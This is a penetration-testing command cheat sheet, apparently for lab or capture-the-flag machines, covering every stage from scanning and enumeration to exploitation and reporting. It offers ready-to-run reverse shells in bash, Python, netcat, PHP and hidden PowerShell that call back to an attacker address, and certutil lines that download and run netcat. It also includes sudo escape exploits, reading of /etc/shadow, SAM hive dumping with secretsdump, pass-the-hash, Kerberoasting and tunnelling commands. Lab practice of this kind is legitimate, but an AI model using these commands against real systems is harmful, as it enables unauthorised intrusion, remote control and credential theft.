# CTRL+F ANYTHING

## PORT SCANNING


```nmap -sC -sV --top-ports 1000 TARGET
nmap -p- -sV -sC TARGET
nmap -sU --top-ports 100 TARGET
nmap -p 445 --script smb-vuln* TARGET
nmap -p 80,443,8080,8443 --script http-* TARGET
```

## WEB ENUMERATION

```
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt
wpscan --url http://TARGET --enumerate u,vp,vt
whatweb http://TARGET
curl -I http://TARGET
python3 web_enum.py -u http://TARGET --full
```
## SMB ENUMERATION

```
smbclient -N -L //TARGET
enum4linux -a TARGET
smbmap -H TARGET
smbclient -N //TARGET/SHARE
smbget -R smb://TARGET/SHARE
crackmapexec smb TARGET -u '' -p '' --shares
rpcclient -U "" -N TARGET
```
## NFS

```
showmount -e TARGET
mount -t nfs TARGET:/export /mnt/nfs -o nolock
```
## FTP

```
ftp TARGET
wget -r ftp://anonymous:@TARGET
```
## SNMP

```
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET
snmpwalk -v2c -c public TARGET
```
## REVERSE SHELLS

```
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
nc -e /bin/sh YOUR_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
php -r '$s=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
## WINDOWS REVERSE SHELLS

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
certutil -urlcache -f http://YOUR_IP/nc.exe nc.exe & nc.exe -e cmd.exe YOUR_IP 4444
```
## TTY UPGRADE
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z then: stty raw -echo; fg
export TERM=xterm
stty rows 50 columns 200
```
## PRIVESC LINUX

```sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
cat /etc/passwd
cat /etc/shadow 2>/dev/null
python3 privesc_checklist.py --all
```
## SUDO EXPLOITS

```
sudo find . -exec /bin/sh \; -quit
sudo python -c 'import pty; pty.spawn("/bin/bash")'
sudo vim -c ':!/bin/sh'
sudo less /etc/profile
!/bin/bash
```

## KERNEL EXPLOITS

```
uname -a
searchsploit linux kernel VERSION
```

## PRIVESC WINDOWS
```
whoami /all
whoami /priv
systeminfo
wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v c:\windows\\
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
cmdkey /list
findstr /si password *.txt *.xml *.config
```
## CREDENTIAL HARVESTING
```
python3 loot_parser.py --output loot.json
reg save hklm\sam sam.hive
reg save hklm\system system.hive
secretsdump.py -sam sam.hive -system system.hive LOCAL
```
## PASSWORD CRACKING
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashid HASH
```
## FILE TRANSFER
```
wget http://YOUR_IP/file
curl http://YOUR_IP/file -o file
python3 -m http.server 80
nc -lvnp 4444 < file
nc -nv TARGET 4444 > file
certutil -urlcache -f http://YOUR_IP/nc.exe nc.exe
Invoke-WebRequest -Uri http://YOUR_IP/nc.exe -OutFile nc.exe
base64 -w0 file
echo "ENCODED" | base64 -d > file
```
## PIVOTING
```
ssh -L 8080:localhost:80 user@TARGET
ssh -D 1080 user@TARGET
ssh -R 8080:localhost:80 user@TARGET
./chisel server -p 8000 --reverse
./chisel client YOUR_IP:8000 R:8080:INTERNAL:80
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80
```
## ACTIVE DIRECTORY
```
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=local"
bloodhound-python -d domain.local -u user -p pass -ns TARGET -c all
impacket-GetNPUsers domain.local/ -usersfile users.txt -format john
impacket-GetUserSPNs domain.local/user:pass -request
impacket-psexec -hashes LM:NT user@TARGET
evil-winrm -i TARGET -u user -p pass
crackmapexec smb TARGET -u user -H NT_HASH -x whoami
```
## EXPLOIT SEARCH
```
searchsploit SERVICE VERSION
python3 auto_pwn.py --nmap scan.xml
python3 vuln_scan.py --xml scan.xml
```
## REPORTING
```
python3 report_builder.py -t TARGET --name "Box Name" --loot loot.json
pandoc report.md -o report.pdf